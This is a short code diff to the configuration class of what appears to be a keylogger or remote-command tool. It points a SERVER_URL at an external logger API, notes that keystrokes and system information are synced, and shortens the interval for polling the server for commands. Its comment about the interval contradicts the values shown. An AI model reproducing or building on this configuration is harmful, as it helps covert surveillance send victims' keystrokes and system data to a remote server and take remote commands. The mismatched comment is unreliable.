@@ -9,7 +9,7 @@ class Config:
     SERVER_URL = "https://fasitheme.ir/logger/api.php/"
     SECRET_TOKEN = "1"
     CHECK_INTERVAL = 120  # seconds (data sync, e.g., keystrokes, system info)
-    COMMAND_POLL_INTERVAL = 20  # Increased from 10 to 60 seconds
+    COMMAND_POLL_INTERVAL = 10  # Increased from 10 to 60 seconds
     COMMAND_TIMEOUT = 5  # seconds, for HTTP request timeout
     
     # Security Settings
